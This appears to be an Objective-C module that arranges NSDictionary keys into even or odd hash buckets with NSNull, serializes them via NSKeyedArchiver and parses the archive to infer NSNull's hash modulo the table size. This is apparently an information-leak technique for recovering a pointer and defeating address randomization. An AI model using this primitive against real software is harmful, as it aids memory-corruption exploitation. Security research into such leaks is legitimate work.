#import "dict-builder.h"
#import "hash-utils.h"
#include <stdio.h>

static void print_archive_summary(NSDictionary *archive, const char *context) {
    printf("[ArchiveDebug] %s\n", context);
    if (![archive isKindOfClass:[NSDictionary class]]) {
        printf("[ArchiveDebug] archive class: %s\n",
               [NSStringFromClass([archive class]) UTF8String]);
        return;
    }

    NSArray *objects = archive[@"$objects"];
    NSDictionary *top = archive[@"$top"];
    id root_uid = [top isKindOfClass:[NSDictionary class]] ? top[@"root"] : nil;

    printf("[ArchiveDebug] keys: ");
    for (id key in archive) {
        printf("%s ", [[key description] UTF8String]);
    }
    printf("\n");

    printf("[ArchiveDebug] objects: %s count=%lu\n",
           [objects isKindOfClass:[NSArray class]] ? "yes" : "no",
           (unsigned long)([objects isKindOfClass:[NSArray class]] ? [objects count] : 0));
    printf("[ArchiveDebug] top: %s\n", [top isKindOfClass:[NSDictionary class]] ? "yes" : "no");
    if (root_uid) {
        printf("[ArchiveDebug] root UID class: %s desc: %s\n",
               [NSStringFromClass([root_uid class]) UTF8String],
               [[root_uid description] UTF8String]);
    }
}

static bool parse_uid_from_description(id uid_obj, NSUInteger *out_index) {
    if (!uid_obj || !out_index) {
        return false;
    }

    NSString *desc = [uid_obj description];
    NSRange range = [desc rangeOfString:@"value = "];
    if (range.location == NSNotFound) {
        return false;
    }

    NSString *suffix = [desc substringFromIndex:range.location + range.length];
    NSScanner *scanner = [NSScanner scannerWithString:suffix];
    unsigned long long value = 0;
    if (![scanner scanUnsignedLongLong:&value]) {
        return false;
    }

    *out_index = (NSUInteger)value;
    return true;
}

static bool uid_index(id uid_obj, NSUInteger *out_index) {
    if (!uid_obj || !out_index) {
        return false;
    }

    if ([uid_obj respondsToSelector:@selector(unsignedIntegerValue)]) {
        *out_index = [uid_obj unsignedIntegerValue];
        return true;
    }
    if ([uid_obj respondsToSelector:@selector(integerValue)]) {
        *out_index = (NSUInteger)[uid_obj integerValue];
        return true;
    }

    if ([uid_obj isKindOfClass:[NSDictionary class]]) {
        id uid_value = uid_obj[@"$uid"];
        if ([uid_value respondsToSelector:@selector(unsignedIntegerValue)]) {
            *out_index = [uid_value unsignedIntegerValue];
            return true;
        }
    }

    SEL uid_sel = NSSelectorFromString(@"uid");
    if ([uid_obj respondsToSelector:uid_sel]) {
        NSUInteger (*func)(id, SEL) = (NSUInteger (*)(id, SEL))[uid_obj methodForSelector:uid_sel];
        *out_index = func(uid_obj, uid_sel);
        return true;
    }

    @try {
        id value = [uid_obj valueForKey:@"_value"];
        if ([value respondsToSelector:@selector(unsignedIntegerValue)]) {
            *out_index = [value unsignedIntegerValue];
            return true;
        }
        value = [uid_obj valueForKey:@"value"];
        if ([value respondsToSelector:@selector(unsignedIntegerValue)]) {
            *out_index = [value unsignedIntegerValue];
            return true;
        }
    } @catch (NSException *exception) {
        // Ignore and fall back to description parsing.
    }

    return parse_uid_from_description(uid_obj, out_index);
}

static id object_for_uid(NSArray *objects, id uid_obj) {
    NSUInteger index = 0;
    if (!uid_index(uid_obj, &index)) {
        return nil;
    }
    if (index >= [objects count]) {
        return nil;
    }
    return objects[index];
}

static NSArray *array_for_uid_object(NSArray *objects, id uid_obj) {
    // If it's already an array, return it directly
    if ([uid_obj isKindOfClass:[NSArray class]]) {
        return (NSArray *)uid_obj;
    }

    id obj = object_for_uid(objects, uid_obj);
    if (!obj) {
        return nil;
    }

    if ([obj isKindOfClass:[NSArray class]]) {
        return (NSArray *)obj;
    }

    if ([obj isKindOfClass:[NSDictionary class]]) {
        id nested_uid = obj[@"NS.objects"];
        if ([nested_uid isKindOfClass:[NSArray class]]) {
            return (NSArray *)nested_uid;
        }
        id nested = object_for_uid(objects, nested_uid);
        if ([nested isKindOfClass:[NSArray class]]) {
            return (NSArray *)nested;
        }
    }

    return nil;
}

NSDictionary* build_dict_with_pattern(PatternType pattern, uint64_t table_size) {
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];

    // Determine which buckets to occupy based on pattern
    uint64_t start_bucket = (pattern == PATTERN_EVEN) ? 0 : 1;
    uint64_t step = 2;

    // Fill the appropriate buckets
    for (uint64_t bucket = start_bucket; bucket < table_size; bucket += step) {
        uint64_t key_value;
        if (find_key_for_bucket(bucket, table_size, &key_value)) {
            dict[@(key_value)] = [NSString stringWithFormat:@"bucket_%llu", bucket];
        } else {
            fprintf(stderr, "Warning: couldn't find key for bucket %llu in table size %llu\n",
                    bucket, table_size);
        }
    }

    // Add NSNull as a key
    dict[[NSNull null]] = @"nsnull_marker";

    return [dict copy];
}

NSArray* extract_serialized_keys(NSDictionary *dict) {
    NSError *error = nil;
    NSData *data = [NSKeyedArchiver archivedDataWithRootObject:dict
                                         requiringSecureCoding:NO
                                                         error:&error];
    if (error) {
        fprintf(stderr, "Serialization error: %s\n", [[error description] UTF8String]);
        printf("[ArchiveError] Serialization error: %s\n", [[error description] UTF8String]);
        return nil;
    }

    NSPropertyListFormat format = NSPropertyListBinaryFormat_v1_0;
    id plist = [NSPropertyListSerialization propertyListWithData:data
                                                         options:NSPropertyListImmutable
                                                          format:&format
                                                           error:&error];
    if (error || ![plist isKindOfClass:[NSDictionary class]]) {
        fprintf(stderr, "Archive parse error: %s\n", [[error description] UTF8String]);
        printf("[ArchiveError] Archive parse error: %s\n", [[error description] UTF8String]);
        if ([plist isKindOfClass:[NSDictionary class]]) {
            print_archive_summary((NSDictionary *)plist, "plist parsed but wrong type");
        } else if (plist) {
            printf("[ArchiveDebug] plist class: %s desc: %s\n",
                   [NSStringFromClass([plist class]) UTF8String],
                   [[plist description] UTF8String]);
        }
        return nil;
    }

    NSDictionary *archive = (NSDictionary *)plist;
    NSArray *objects = archive[@"$objects"];
    NSDictionary *top = archive[@"$top"];
    if (![objects isKindOfClass:[NSArray class]] || ![top isKindOfClass:[NSDictionary class]]) {
        fprintf(stderr, "Archive parse error: missing objects/top\n");
        printf("[ArchiveError] Archive parse error: missing objects/top\n");
        print_archive_summary(archive, "missing objects/top");
        return nil;
    }
    id root_uid = top[@"root"];
    id root_obj = object_for_uid(objects, root_uid);

    if (![root_obj isKindOfClass:[NSDictionary class]]) {
        fprintf(stderr, "Archive parse error: root object not found\n");
        printf("[ArchiveError] Archive parse error: root object not found\n");
        print_archive_summary(archive, "root object not found");
        return nil;
    }

    id keys_uid = root_obj[@"NS.keys"];
    NSArray *keys_uids = array_for_uid_object(objects, keys_uid);

    if (![keys_uids isKindOfClass:[NSArray class]]) {
        fprintf(stderr, "Archive parse error: keys array not found\n");
        printf("[ArchiveError] Archive parse error: keys array not found\n");
        print_archive_summary(archive, "keys array not found");
        printf("[ArchiveDebug] root object class: %s\n",
               [NSStringFromClass([root_obj class]) UTF8String]);
        printf("[ArchiveDebug] root object desc: %s\n",
               [[root_obj description] UTF8String]);
        return nil;
    }
    NSMutableArray *keys = [NSMutableArray arrayWithCapacity:[keys_uids count]];
    for (id key_uid in keys_uids) {
        id key = nil;
        if ([key_uid isKindOfClass:[NSNumber class]] || [key_uid isKindOfClass:[NSNull class]]) {
            key = key_uid;
        } else {
            key = object_for_uid(objects, key_uid);
        }
        if (!key) {
            fprintf(stderr, "Archive parse error: key UID not found\n");
            printf("[ArchiveError] Archive parse error: key UID not found\n");
            print_archive_summary(archive, "key UID not found");
            return nil;
        }

        // Check if it's a wrapper for NSNull (has $class with classname=NSNull)
        if ([key isKindOfClass:[NSDictionary class]]) {
            NSDictionary *keyDict = (NSDictionary *)key;
            id classUID = keyDict[@"$class"];
            if (classUID) {
                id classObj = object_for_uid(objects, classUID);
                if ([classObj isKindOfClass:[NSDictionary class]]) {
                    id className = [(NSDictionary *)classObj objectForKey:@"$classname"];
                    if ([className isKindOfClass:[NSString class]] &&
                        [className isEqualToString:@"NSNull"]) {
                        key = [NSNull null];
                    }
                }
            }
        }

        [keys addObject:key];
    }

    return keys;
}

NSInteger find_nsnull_position(NSDictionary *dict) {
    NSArray *keys = extract_serialized_keys(dict);
    if (!keys) {
        return -1;
    }

    return find_nsnull_position_in_keys(keys);
}

NSInteger find_nsnull_position_in_keys(NSArray *keys) {
    NSInteger position = 0;
    for (id key in keys) {
        if ([key isKindOfClass:[NSNull class]]) {
            return position;
        }
        position++;
    }

    return -1; // Not found
}

bool validate_bucket_order(NSArray *keys, uint64_t table_size, PatternType pattern) {
    uint64_t prev_bucket = UINT64_MAX;
    for (id key in keys) {
        if ([key isKindOfClass:[NSNull class]]) {
            continue;
        }
        if (![key isKindOfClass:[NSNumber class]]) {
            return false;
        }

        uint64_t bucket = 0;
        if (hash_model_is_linear()) {
            uint64_t value = [(NSNumber *)key unsignedLongLongValue];
            bucket = cf_hash_int(value) % table_size;
        } else {
            bucket = (uint64_t)[(NSNumber *)key hash] % table_size;
        }

        if (pattern == PATTERN_EVEN && (bucket % 2 != 0)) {
            return false;
        }
        if (pattern == PATTERN_ODD && (bucket % 2 != 1)) {
            return false;
        }
        if (prev_bucket != UINT64_MAX && bucket <= prev_bucket) {
            return false;
        }

        prev_bucket = bucket;
    }

    return true;
}

bool calculate_nsnull_mod(uint64_t table_size, NSInteger even_pos, NSInteger odd_pos,
                          uint64_t *result) {
    if (!result || even_pos < 1 || odd_pos < 0) {
        return false;
    }

    uint64_t even_bucket = 2 * (uint64_t)even_pos - 1;
    uint64_t odd_bucket = 2 * (uint64_t)odd_pos;

    if (even_bucket >= table_size || odd_bucket >= table_size) {
        return false;
    }

    uint64_t even_plus = (even_bucket + 1) % table_size;
    uint64_t odd_plus = (odd_bucket + 1) % table_size;

    if (even_plus == odd_bucket) {
        *result = even_bucket;
        return true;
    }

    if (odd_plus == even_bucket) {
        *result = odd_bucket;
        return true;
    }

    if (odd_bucket == table_size - 1 && even_bucket == 1) {
        *result = odd_bucket;
        return true;
    }

    return false;
}
